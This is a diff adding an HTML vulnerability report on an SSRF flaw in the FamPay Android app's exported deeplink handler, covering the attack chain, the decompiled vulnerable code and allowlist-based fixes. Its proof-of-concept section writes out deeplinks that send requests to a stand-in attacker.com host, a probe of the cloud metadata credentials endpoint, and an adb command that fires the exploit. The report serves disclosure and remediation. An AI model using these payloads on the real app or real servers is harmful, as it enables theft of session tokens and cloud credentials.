@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chain B Report — DAI SSRF | FamPay Security</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:#0a0a0f;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:24px 16px;max-width:760px;margin:0 auto;font-size:13px;line-height:1.7}
+  h1{font-size:22px;font-weight:900;color:#fff;margin-bottom:4px}
+  h2{font-size:14px;font-weight:700;color:#ff6d00;margin:28px 0 10px;letter-spacing:0.3px;text-transform:uppercase}
+  h3{font-size:12px;font-weight:700;color:#aaa;margin:16px 0 6px;text-transform:uppercase;letter-spacing:0.3px}
+  p{color:#bbb;margin-bottom:10px}
+  .badge{display:inline-block;font-size:10px;background:#1a0a00;border:1px solid #ff6d00;color:#ff6d00;padding:3px 12px;border-radius:20px;letter-spacing:1px;margin-bottom:12px}
+  .severity-bar{display:flex;align-items:center;gap:12px;background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:16px 20px;margin-bottom:20px}
+  .sev-label{font-size:11px;color:#666;text-transform:uppercase;letter-spacing:0.5px}
+  .sev-high{font-size:28px;font-weight:900;color:#ff6d00}
+  .sev-score{font-size:13px;color:#888}
+  .divider{width:1px;height:40px;background:#2a2a3a}
+  .meta-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px}
+  .meta-card{background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:14px}
+  .meta-card .mk{font-size:10px;color:#555;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:4px}
+  .meta-card .mv{font-size:12px;color:#e0e0e0;font-family:monospace}
+  .impact-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:20px}
+  .impact-card{background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:12px}
+  .impact-card .ic-label{font-size:10px;color:#ff6d00;text-transform:uppercase;margin-bottom:4px}
+  .impact-card .ic-val{font-size:12px;color:#e0e0e0}
+  code{background:#1a1a2a;border:1px solid #2a2a3a;padding:2px 6px;border-radius:3px;font-family:monospace;font-size:11px;color:#00e676}
+  pre{background:#0d0d14;border:1px solid #2a2a3a;border-radius:6px;padding:14px;overflow-x:auto;font-size:11px;color:#00e676;line-height:1.6;margin:10px 0}
+  .attack-chain{background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:16px;margin:10px 0}
+  .chain-step{display:flex;gap:12px;align-items:flex-start;padding:8px 0;border-bottom:1px solid #1a1a2a}
+  .chain-step:last-child{border:none}
+  .step-num{background:#ff6d00;color:#000;font-size:10px;font-weight:900;padding:2px 7px;border-radius:10px;min-width:24px;text-align:center;margin-top:1px}
+  .step-body .step-title{font-size:12px;color:#fff;font-weight:700;margin-bottom:2px}
+  .step-body .step-desc{font-size:11px;color:#888}
+  .fix-card{background:#0d1a0d;border:1px solid #1a3a1a;border-radius:8px;padding:14px;margin:8px 0}
+  .fix-card h4{font-size:11px;color:#00e676;margin-bottom:8px;text-transform:uppercase;letter-spacing:0.3px}
+  .tag{display:inline-block;font-size:9px;background:#1a1a2a;border:1px solid #2a2a3a;color:#448aff;padding:1px 6px;border-radius:3px;margin-right:4px}
+  .back-links{display:flex;gap:16px;font-size:11px;margin-top:28px;flex-wrap:wrap}
+  .back-links a{color:#448aff;text-decoration:none}
+</style>
+</head>
+<body>
+
+<span class="badge">INTERNAL SECURITY REPORT — CHAIN B</span>
+<h1>DAI SSRF via Exported DeepLinkActivity</h1>
+<p style="color:#666;font-size:11px;margin-bottom:20px">FamPay Android v4.0.5.7 · Oversecured Finding #8 + #2 · March 2026</p>
+
+<div class="severity-bar">
+  <div><div class="sev-label">Severity</div><div class="sev-high">HIGH</div></div>
+  <div class="divider"></div>
+  <div><div class="sev-label">CVSS Score</div><div class="sev-score" style="font-size:22px;font-weight:700;color:#ff6d00">8.1</div></div>
+  <div class="divider"></div>
+  <div><div class="sev-label">Vector</div><div class="sev-score">AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N</div></div>
+</div>
+
+<div class="meta-grid">
+  <div class="meta-card"><div class="mk">Vulnerability</div><div class="mv">Internet Service Address Substitution (SSRF)</div></div>
+  <div class="meta-card"><div class="mk">Affected Component</div><div class="mv">DeepLinkActivity /dai/ handler</div></div>
+  <div class="meta-card"><div class="mk">Entry Point</div><div class="mv">fp://fampay.in/l/dai/?url=</div></div>
+  <div class="meta-card"><div class="mk">Authentication Required</div><div class="mv">None — any app can send this Intent</div></div>
+</div>
+
+<h2>Executive Summary</h2>
+<p>FamPay's deeplink handler contains a Server-Side Request Forgery (SSRF) vulnerability. Any app installed on the same device can send a specially crafted link to FamPay that forces it to make HTTP requests to any URL the attacker specifies — including internal company servers, cloud metadata endpoints, and the attacker's own server. This is the digital equivalent of tricking FamPay into delivering a message to any address on behalf of the attacker.</p>
+<p>When chained with the JS Interface vulnerability (Chain A / Vuln #16), an attacker who gets a user to visit a malicious website can silently trigger this SSRF from inside the FamPay WebView — with no additional user interaction.</p>
+
+<h2>Impact</h2>
+<div class="impact-grid">
+  <div class="impact-card"><div class="ic-label">Internal Network Access</div><div class="ic-val">App can be used to probe FamPay's internal API servers not accessible from outside</div></div>
+  <div class="impact-card"><div class="ic-label">Cloud Metadata Theft</div><div class="ic-val">AWS/GCP/Azure metadata endpoints (169.254.169.254) may expose instance credentials</div></div>
+  <div class="impact-card"><div class="ic-label">Auth Token Leakage</div><div class="ic-val">If backend attaches user auth headers, they leak to attacker server</div></div>
+  <div class="impact-card"><div class="ic-label">Port Scanning</div><div class="ic-val">Internal firewall-protected ports can be probed via the victim's device/session</div></div>
+</div>
+
+<h2>Attack Chain</h2>
+<div class="attack-chain">
+  <div class="chain-step">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <div class="step-title">Attacker sends DAI deeplink</div>
+      <div class="step-desc">Via malicious website, QR code, or another app: <code>fp://fampay.in/l/dai/?url=https://attacker.com/log</code></div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">2</div>
+    <div class="step-body">
+      <div class="step-title">DeepLinkActivity processes /dai/ path</div>
+      <div class="step-desc">Line 912: <code>str.contains("/dai/")</code> → extracts <code>url</code> param without validation</div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">3</div>
+    <div class="step-body">
+      <div class="step-title">App makes HTTP request to attacker URL</div>
+      <div class="step-desc"><code>DaiRepository.performDaiGet(queryParameter)</code> — no allowlist, no scheme check</div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">4</div>
+    <div class="step-body">
+      <div class="step-title">Attacker receives request with FamPay headers</div>
+      <div class="step-desc">User-Agent, authorization headers, and session identifiers appear in attacker's logs</div>
+    </div>
+  </div>
+</div>
+
+<h2>Vulnerable Code</h2>
+<h3>DeepLinkActivity.java — DAI Handler (Lines 912–925)</h3>
+<pre>} else if (str.contains("/dai/")) {
+    String queryParameter10 = uri.getQueryParameter("url");
+    String queryParameter11 = uri.getQueryParameter("payload");
+    if (!TextUtils.isEmpty(queryParameter10)) {
+        if (!TextUtils.isEmpty(queryParameter11)) {
+            // POST request to attacker-controlled URL
+            DaiRepository.a().f16034a.performDaiPost(queryParameter10, queryParameter11);
+        } else {
+            // GET request to attacker-controlled URL
+            DaiRepository.a().f16034a.performDaiGet(queryParameter10);
+        }
+    }
+}</pre>
+<p>There is <strong>no URL validation</strong>. The <code>url</code> parameter is used directly as a network destination. An attacker can set it to any internal IP, cloud metadata endpoint, or their own server.</p>
+
+<h2>Proof of Concept</h2>
+<h3>Malicious Deeplink (GET SSRF)</h3>
+<pre>fp://fampay.in/l/dai/?url=https://attacker.com/log?tag=ssrf</pre>
+
+<h3>Cloud Metadata Probe</h3>
+<pre>fp://fampay.in/l/dai/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</pre>
+
+<h3>POST SSRF with Payload</h3>
+<pre>fp://fampay.in/l/dai/?url=https://attacker.com/log&amp;payload=%7B%22ssrf%22%3A%22test%22%7D</pre>
+
+<h3>ADB Test Command</h3>
+<pre>adb shell am start -a android.intent.action.VIEW \
+  -d "fp://fampay.in/l/dai/?url=https://attacker.com/log?tag=ssrf_probe" \
+  com.fampay.in</pre>
+
+<h2>Remediation</h2>
+<div class="fix-card">
+  <h4>Fix 1 — Allowlist Validation (Recommended)</h4>
+  <pre>private static final List&lt;String&gt; DAI_ALLOWLIST = Arrays.asList(
+    "https://api.fampay.in",
+    "https://dai.fampay.in"
+);
+
+String daiUrl = uri.getQueryParameter("url");
+if (daiUrl != null) {
+    boolean allowed = DAI_ALLOWLIST.stream().anyMatch(daiUrl::startsWith);
+    if (!allowed) {
+        Log.w(TAG, "DAI SSRF blocked: " + daiUrl);
+        return; // reject
+    }
+    DaiRepository.a().f16034a.performDaiGet(daiUrl);
+}</pre>
+</div>
+<div class="fix-card">
+  <h4>Fix 2 — Remove External Export</h4>
+  <p>If the DAI handler is only needed for internal app navigation, set <code>android:exported="false"</code> on DeepLinkActivity or handle it via an internal-only mechanism not exposed to other apps.</p>
+</div>
+<div class="fix-card">
+  <h4>Fix 3 — Block Private IP Ranges</h4>
+  <pre>// Reject requests to RFC-1918 / link-local / loopback addresses
+if (isPrivateAddress(Uri.parse(daiUrl).getHost())) {
+    return; // block internal network probing
+}</pre>
+</div>
+
+<h2>References</h2>
+<p><span class="tag">CWE-918</span> Server-Side Request Forgery</p>
+<p><span class="tag">OWASP</span> SSRF Prevention Cheat Sheet</p>
+<p><span class="tag">Oversecured</span> Finding #8 — Internet Service Address Substitution</p>
+
+<div class="back-links">
+  <a href="/chain-b-trigger">&#9889; Trigger PoC</a>
+  <a href="/chain-b-exploit">&#128293; Exploit Page</a>
+  <a href="/log-viewer">&#128225; Log Viewer</a>
+  <a href="/">&#8592; All Chains</a>
+</div>
+
+</body>
+</html>
